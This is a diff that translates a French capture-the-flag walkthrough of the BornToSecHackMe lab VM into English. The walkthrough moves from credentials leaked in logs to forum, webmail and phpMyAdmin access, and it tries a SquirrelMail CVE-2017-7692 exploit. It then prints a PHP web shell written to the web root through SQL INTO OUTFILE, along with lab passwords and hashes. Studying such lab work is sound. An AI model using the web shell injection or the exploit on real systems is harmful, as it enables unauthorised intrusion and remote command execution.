@@ -55,41 +55,40 @@ With ``dirb``, on https, we find this interesting:
 Inside we study the logs and we realize that the user must have tried to put his password instead of the login here:
 >Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user **!q\]Ej?*5K5cy*AJ** from 161.202.39.38 port 57764 ssh2
 
-On connait deja son login grace a plusieurs lignes dont celle-ci :
+We have already identified their login information from several lines including the one below:
 
 >Oct 5 09:21:01 BornToSecHackMe CRON[9111]: pam_unix(cron:session): session closed for user **lmezard**
 
-- On teste sur le forum, **lmezard / !q\]Ej?*5K5cy*AJ** -> Ca fonctionne.
-- On trouve son adresse mail sur son profil **laurie@borntosec.net**
+- We tried on the forum, lmezard / !q]Ej?5K5cyAJ -> It works.
+- We found their email address on their profile: **laurie@borntosec.net**
 
 ##### /webmail
-- SquirrelMail version 1.4.22
-- Avec les infos collectees sur le forum on se connecte laurie@borntosec.net / !q\]Ej?*5K5cy*AJ
-- On trouve un mail -> You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
+- SquirrelMail v1.4.22
+- Using the information gathered from the forum, we logged in: laurie@borntosec.net / !q\]Ej?*5K5cy*AJ
+- We found an email :
+``You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$``
+
 **On va pouvoir probablement se connecter a phpmyadmin**
-- Faille connue : SquirrelMail <= 1.4.23 Remote Code Execution PoC Exploit (CVE-2017-7692)
+
+- Known vulnerability : SquirrelMail <= 1.4.23 Remote Code Execution PoC Exploit (CVE-2017-7692)
 ``bash /usr/share/exploitdb/exploits/linux/remote/41910.sh https://192.168.31.26/webmail``
--> Ne semble pas fonctionner
+-> Does not seem to work
 
 ##### /phpmyadmin
-- Le combo **root / Fg-'kKXBj87E:aJ$** fonctionne
-
-- Dans forum_db, mlf2_settings on obtient la **version de my little forum : 2.3.4**
-
-- Dans forum_db / mlt2_userdata, on a acces aux mots de passe cryptes de tout le monde **-> A VOIR ? ESSAYER DE DECRYPTER EN CHERCHANT DES INFOS SUR LA METHODE DE CRYPTAGE EMPLOYEE PAR CETTE VERSION DE MY LITTLE FORUM**
-- En passant lmezard en type 2, il devient admin **-> UTILE ?**
-- Dans mysql il y a une table user, avec root / debian-sys-maint avec les mdps en sha1 :
+- The combination **root / Fg-'kKXBj87E:aJ$** works
+- In forum_db, mlf2_settings we find the version of my little forum: 2.3.4
+- In forum_db / mlt2_userdata, we have access to everyone's encrypted passwords -> TO BE EXPLORED? TRY DECRYPTING BY FINDING INFORMATION ON THE ENCRYPTION METHOD USED BY THIS VERSION OF MY LITTLE FORUM
+- In MySQL there is a user table, with root / debian-sys-maint and the passwords in sha1:
 >root / 8A074E30DC25CE94B17C9858F794303F71E3BCC7
-
--> Il doit probablement correspondre a Fg-'kKXBj87E:aJ$
+-> This probably corresponds to Fg-'kKXBj87E:aJ$
 
 >debian-sys-maint / 52B24D4192EDDFB439C67E1F92421C4D2D4F5598
-
-- On tente de decrypter les mots de passe, sans succes.
-
-- On va **creer un reverseShell** assez simple en injectant :
-``SELECT "<HTML><BODY><FORM METHOD='GET' NAME='myform' ACTION=''><INPUT TYPE='text' NAME='cmd'><INPUT TYPE='submit' VALUE='Send'></FORM><pre><?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?> </pre></BODY></HTML>" INTO OUTFILE '/var/www/forum/templates_c/cmd.php'``
-- On peut maintenant y acceder ici : https://192.168.31.26/forum/templates_c/cmd.php
+- We attempted to decrypt the passwords, without success.
+We will create a simple reverse shell by injecting:
+````
+SELECT "<HTML><BODY><FORM METHOD='GET' NAME='myform' ACTION=''><INPUT TYPE='text' NAME='cmd'><INPUT TYPE='submit' VALUE='Send'></FORM><pre><?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?> </pre></BODY></HTML>" INTO OUTFILE '/var/www/forum/templates_c/cmd.php'
+````
+- We can now access it here:  https://192.168.31.26/forum/templates_c/cmd.php
 
 ----
 
